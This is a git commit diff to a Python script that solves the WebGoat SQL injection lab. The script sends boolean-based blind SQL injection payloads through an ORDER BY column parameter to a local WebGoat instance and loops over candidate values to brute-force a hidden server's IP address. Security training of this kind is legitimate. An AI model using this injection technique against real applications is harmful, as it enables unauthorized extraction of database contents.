6a24dd81da48443b9ca853ea0221a95f31b22d32
= <=>
2019-10-25 16:09:09 -0400

    updated WebGoatListofservers

--- WebGoatListofservers.py
+++ WebGoatListofservers.py
@@ -6,7 +6,7 @@ import json
 
 WebGoatIP = '127.0.0.1:8080'
 Request = 'http://{}/WebGoat/SqlInjection/servers?column={}' #FIXME
-JSESSIONID = 'BEBFC1B7D47DDA7998FA1AA86ECA12EA' #FIXME
+JSESSIONID = '166548C2EC5DEFB28CF677503338BE4F' #FIXME
 
 regEx = re.compile('\* [0-9]+\-[0-9]+')
 
@@ -53,30 +53,26 @@ def getRequest(sortBy, debug=True):
 def test():
     #sort by id, hostname, ip
     #sortBy = 'hostname'
-    sortBy = "(case when (select ip from servers where hostname='webgoat-pre-prod') = '192.168.6.4' then \
+    sortBy = "(case when (select ip from servers where hostname='webgoat-pre-prod') = '192.168.6.10' then \
         id else hostname end)" # this is true; so sort by id; also we confirmed that servers table exists
-    if getRequest(sortyBy, True):
+    if getRequest(sortBy, True):
         print('Success!')
     else:
         print('Keep trying!')
 
 # Runt this for to find the ip of webgoat-prd server
 def bruteForce():
-    sortyBy = """
+    sortBy = """
     (case when (select ip from servers where hostname='webgoat-prd') = '{}' then
     id else hostname end)
     """
     for i in range(1, 255): # check for values between 1 and 254.130.219.202
         ip = '{}.130.219.202'.format(i)
-        if getRequest(sortyBy.format(ip), False):
+        if getRequest(sortBy.format(ip), False):
             print('Success!')
             print('The ip address is {}'.format(ip))
             break
 
-if __name__ == "__main__":
-    #getRequest()
-    #test()
-    bruteForce()
 
 def postRequest():
     formData = {'Username': 'hacker',
@@ -109,3 +105,8 @@ def postRequest():
             #    print("Successfully hacked...Well done!")  
             #    break
 
+
+if __name__ == "__main__":
+    #getRequest()
+    test()
+    #bruteForce()
